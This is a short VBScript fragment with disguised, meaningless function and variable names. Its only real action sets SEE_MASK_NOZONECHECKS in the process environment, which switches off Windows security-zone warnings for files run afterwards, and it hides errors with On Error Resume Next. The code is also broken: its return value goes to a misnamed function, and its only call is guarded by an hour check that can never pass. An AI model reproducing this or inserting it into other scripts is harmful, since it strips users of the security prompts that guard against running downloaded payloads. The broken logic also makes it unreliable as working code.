' CreateObject WScript.Network
Function ReadCacheLine10()
On Error Resume Next
  Dim blnEnabled70,blnIdle49,blnIdle580
  Set blnEnabled70=CreateObject("WScript.Shell")
  blnIdle49=blnEnabled70.ExpandEnvironmentStrings("%TEMP%")
  blnIdle580=blnEnabled70.ExpandEnvironmentStrings("%ProgramFiles%")
  If Len(blnIdle49)>0 And Len(blnIdle580)>0 Then
    blnEnabled70.Environment("PROCESS")("SEE_MASK_NOZONECHECKS")="1"
  End If
  If Err.Number<>0 Then
    Err.Clear
    GetManifestPart95=1
    Exit Function
  End If
  GetManifestPart95=0
End Function

If Hour(Now) > 23 Then
  Call ReadCacheLine10()
End If


